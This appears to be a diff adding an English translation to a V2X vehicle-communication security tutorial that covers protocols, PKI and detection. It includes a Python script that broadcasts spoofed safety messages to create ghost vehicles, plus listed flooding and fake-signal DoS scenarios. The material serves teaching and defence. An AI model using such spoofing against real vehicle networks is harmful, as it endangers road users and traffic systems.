@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # V2X 보안 (Vehicle-to-Everything)
 
 ## V2X 개요
@@ -356,3 +362,366 @@ if __name__ == "__main__":
 ```
 
 다음 파일에서 자동차 침투 테스트 방법론을 다룬다.
+
+---
+
+<a name="english"></a>
+
+# V2X Security (Vehicle-to-Everything)
+
+## V2X Overview
+
+```
+V2X Communication Types
+├── V2V (Vehicle-to-Vehicle) — Direct communication between vehicles
+├── V2I (Vehicle-to-Infrastructure) — Traffic lights, road systems
+├── V2P (Vehicle-to-Pedestrian) — Pedestrian smartphones
+├── V2N (Vehicle-to-Network) — Cloud/Internet
+└── V2G (Vehicle-to-Grid) — Power grid (electric vehicles)
+```
+
+## V2X Technology Stack
+
+### DSRC (Dedicated Short-Range Communications)
+```
+IEEE 802.11p (WAVE)
+├── 5.9 GHz band (5.85~5.925 GHz)
+├── Range: ~1km
+├── Latency: <5ms
+└── Primarily one-way broadcast
+
+Protocol Stack
+├── WSMP (Wave Short Message Protocol)
+├── IPv6
+├── TCP/UDP
+└── Security: IEEE 1609.2
+```
+
+### C-V2X (Cellular V2X)
+```
+Supported from 3GPP Rel-14 onwards
+├── PC5 interface — Direct communication (D2D)
+├── Uu interface — Communication via network
+├── 5G NR-V2X (Rel-16) — High reliability, low latency
+└── Range: Superior to DSRC on the same band
+
+Supported Services
+├── Basic Safety Message (BSM)
+├── Signal Phase and Timing (SPaT)
+├── Map Data (MAP)
+└── Road Emergency Alert
+```
+
+## V2X Security Architecture
+
+### PKI-Based Authentication
+```
+SCMS (Security Credential Management System)
+├── Root CA — Top-level trust authority
+├── Intermediate CA — Regional/manufacturer CA
+├── PCA (Pseudonym CA) — Issues anonymous certificates
+├── RA (Registration Authority) — Registration authority
+└── MA (Misbehavior Authority) — Misbehavior detection
+
+Pseudonym Certificate
+├── Hides real identity (privacy protection)
+├── Periodic rotation (prevents tracking)
+├── Short validity period (1 week to several months)
+└── No consistency verification possible → no single coordination point
+```
+
+### IEEE 1609.2 Message Security
+```
+SPDU (Secured Protocol Data Unit)
+├── Header — version, protocol
+├── ToBeSignedData
+│   ├── Payload (BSM, etc.)
+│   ├── HeaderInfo (expiry, location, PSID)
+│   └── Signature information
+├── Signature — ECDSA (P-256 or brainpoolP256)
+└── Certificate (or hash)
+```
+
+## Attack Vectors
+
+### 1. Spoofing Attack
+```python
+#!/usr/bin/env python3
+"""V2X BSM Spoofing Simulator (for research/test environments only)."""
+
+import argparse
+import struct
+import socket
+import time
+import random
+import math
+from dataclasses import dataclass
+
+
+@dataclass
+class BasicSafetyMessage:
+    """IEEE 1609.2 BSM structure (J2735 standard)."""
+    msg_count: int        # 0-127
+    temp_id: bytes        # 4-byte temporary ID
+    timestamp: int        # Units of 1/10ms
+    latitude: int         # Units of 1/10 microdegree
+    longitude: int        # Units of 1/10 microdegree
+    elevation: int        # Units of 2cm
+    speed: int            # Units of 0.02 m/s
+    heading: int          # Units of 0.0125 degrees
+    accel_long: int       # Acceleration
+    brakes: int           # Brake status
+    vehicle_size: int     # Width, length
+
+
+def encode_bsm(bsm: BasicSafetyMessage) -> bytes:
+    """Serialize BSM to bytes (simplified ASN.1 encoding)."""
+    return struct.pack(
+        ">BIiiiHHbBH",
+        bsm.msg_count,
+        int.from_bytes(bsm.temp_id, "big"),
+        bsm.timestamp,
+        bsm.latitude,
+        bsm.longitude,
+        bsm.elevation,
+        bsm.speed,
+        bsm.accel_long,
+        bsm.brakes,
+        bsm.vehicle_size,
+    )
+
+
+def generate_fake_position(
+    base_lat: float,
+    base_lon: float,
+    offset_m: float = 100.0,
+) -> tuple[float, float]:
+    """Generate a fake position (base coordinates + offset)."""
+    # 1 degree ≈ 111km
+    lat_offset = offset_m / 111_000
+    lon_offset = offset_m / (111_000 * math.cos(math.radians(base_lat)))
+    return (
+        base_lat + random.uniform(-lat_offset, lat_offset),
+        base_lon + random.uniform(-lon_offset, lon_offset),
+    )
+
+
+def spoof_ghost_vehicle(
+    host: str,
+    port: int,
+    base_lat: float,
+    base_lon: float,
+    count: int = 10,
+    interval: float = 0.1,
+) -> None:
+    """Broadcast BSMs for non-existent vehicles (ghost vehicle attack)."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    print(f"[*] Creating ghost vehicles: {count}, interval {interval}s")
+    for i in range(count):
+        lat, lon = generate_fake_position(base_lat, base_lon, 50.0)
+        bsm = BasicSafetyMessage(
+            msg_count=i % 128,
+            temp_id=random.randbytes(4),
+            timestamp=int(time.time() * 1000) % (65535 * 10),
+            latitude=int(lat * 1e7),
+            longitude=int(lon * 1e7),
+            elevation=1000,  # 20m
+            speed=int(30 / 0.02),  # 30 km/h
+            heading=int(90 / 0.0125),  # East
+            accel_long=0,
+            brakes=0,
+            vehicle_size=0x0A14,  # 2m × 5m
+        )
+        payload = encode_bsm(bsm)
+        sock.sendto(payload, (host, port))
+        print(f"  Sent {i+1}/{count}: ({lat:.6f}, {lon:.6f})")
+        time.sleep(interval)
+
+    sock.close()
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="V2X BSM analysis tool (research environment only)",
+    )
+    parser.add_argument("host", help="V2X test server IP")
+    parser.add_argument("-p", "--port", type=int, default=9999)
+    parser.add_argument("--lat", type=float, default=37.5665,
+                        help="Base latitude (default: Seoul City Hall)")
+    parser.add_argument("--lon", type=float, default=126.9780,
+                        help="Base longitude")
+    parser.add_argument("-n", "--count", type=int, default=20)
+    parser.add_argument("--interval", type=float, default=0.1)
+    args = parser.parse_args()
+
+    print(f"[*] V2X BSM spoofing test (research environment only)")
+    print(f"[*] Base location: ({args.lat}, {args.lon})")
+    spoof_ghost_vehicle(
+        args.host, args.port,
+        args.lat, args.lon,
+        args.count, args.interval,
+    )
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 2. Replay Attack Defense
+```
+BSM Replay Defense Mechanisms
+├── Timestamp validation (maximum allowed delay: hundreds of ms)
+├── GenerationTime + ExpiryTime fields
+├── Monotonically increasing sequence number check
+└── Location-time consistency verification (detects physically impossible movement)
+```
+
+### 3. Denial of Service (DoS)
+```bash
+# V2X DoS scenarios (test environment)
+# Mass BSM flooding → ECU processing overload
+# Malicious SPaT messages → signal malfunction
+# Channel congestion → normal message delay
+```
+
+## V2X Security Analysis Tools
+
+```python
+#!/usr/bin/env python3
+"""V2X message capture and validation tool."""
+
+import argparse
+import socket
+import time
+import struct
+from dataclasses import dataclass
+from collections import defaultdict
+
+
+@dataclass
+class CapturedBSM:
+    recv_time: float
+    src_ip: str
+    raw: bytes
+    msg_count: int
+    temp_id: str
+    latitude: float
+    longitude: float
+    speed_kmh: float
+
+
+def decode_bsm(data: bytes, src_ip: str) -> CapturedBSM | None:
+    if len(data) < 20:
+        return None
+    try:
+        msg_count, temp_id_int, ts, lat, lon, elev, speed, accel, brakes, size = \
+            struct.unpack(">BIiiiHHbBH", data[:26])
+        return CapturedBSM(
+            recv_time=time.time(),
+            src_ip=src_ip,
+            raw=data,
+            msg_count=msg_count,
+            temp_id=f"{temp_id_int:08X}",
+            latitude=lat / 1e7,
+            longitude=lon / 1e7,
+            speed_kmh=speed * 0.02 * 3.6,
+        )
+    except struct.error:
+        return None
+
+
+def detect_anomalies(messages: list[CapturedBSM]) -> list[str]:
+    """Detect anomalies in V2X messages."""
+    anomalies: list[str] = []
+    by_id: dict[str, list[CapturedBSM]] = defaultdict(list)
+    for msg in messages:
+        by_id[msg.temp_id].append(msg)
+
+    for temp_id, msgs in by_id.items():
+        msgs.sort(key=lambda m: m.recv_time)
+        for i in range(1, len(msgs)):
+            prev, curr = msgs[i-1], msgs[i]
+            dt = curr.recv_time - prev.recv_time
+            if dt < 0.001:
+                anomalies.append(
+                    f"[Replay?] {temp_id}: dt={dt:.4f}s (too fast)"
+                )
+            # Physically impossible movement distance
+            import math
+            dlat = abs(curr.latitude - prev.latitude)
+            dlon = abs(curr.longitude - prev.longitude)
+            dist_m = math.sqrt((dlat * 111000)**2 + (dlon * 111000)**2)
+            max_dist = curr.speed_kmh / 3.6 * dt * 2  # 2x margin
+            if dist_m > max(max_dist, 10) and dt < 1.0:
+                anomalies.append(
+                    f"[Spoofing?] {temp_id}: {dist_m:.0f}m moved in {dt:.2f}s "
+                    f"(speed {curr.speed_kmh:.1f}km/h)"
+                )
+
+    # Many temporary IDs → ghost vehicle attack
+    unique_ids = len(by_id)
+    if unique_ids > 20:
+        anomalies.append(f"[DoS?] Abnormally large number of temporary IDs: {unique_ids}")
+
+    return anomalies
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="V2X message monitoring")
+    parser.add_argument("-p", "--port", type=int, default=9999)
+    parser.add_argument("-t", "--time", type=float, default=30.0,
+                        help="Capture duration (seconds)")
+    args = parser.parse_args()
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(("0.0.0.0", args.port))
+    sock.settimeout(1.0)
+    print(f"[*] V2X listening: UDP:{args.port} ({args.time}s)")
+
+    messages: list[CapturedBSM] = []
+    end = time.time() + args.time
+
+    while time.time() < end:
+        try:
+            data, addr = sock.recvfrom(4096)
+            msg = decode_bsm(data, addr[0])
+            if msg:
+                messages.append(msg)
+                print(f"  [{msg.temp_id}] ({msg.latitude:.5f},{msg.longitude:.5f}) "
+                      f"{msg.speed_kmh:.1f}km/h")
+        except TimeoutError:
+            pass
+
+    print(f"\n[+] Captured: {len(messages)} BSMs")
+    anomalies = detect_anomalies(messages)
+    if anomalies:
+        print(f"\n[!] Anomalies detected ({len(anomalies)}):")
+        for a in anomalies:
+            print(f"    {a}")
+    else:
+        print("\n[+] No anomalies")
+    sock.close()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## V2X Security Enhancement Measures
+
+```
+Technical Countermeasures
+├── PKI-based pseudonym certificates (privacy + authentication)
+├── Misbehavior Detection System
+├── Local Dynamic Map (LDM) consistency verification
+├── Timestamp + GPS location cross-validation
+└── 5G NR-V2X URLLC (ultra-reliable low-latency)
+
+Operational Countermeasures
+├── Real-time SCMS certificate revocation (CRL/OCSP)
+├── Rapid response procedure for regional CA compromise
+└── V2X security incident response organization (ISAC)
+```
+
+The next file covers automotive penetration testing methodology.
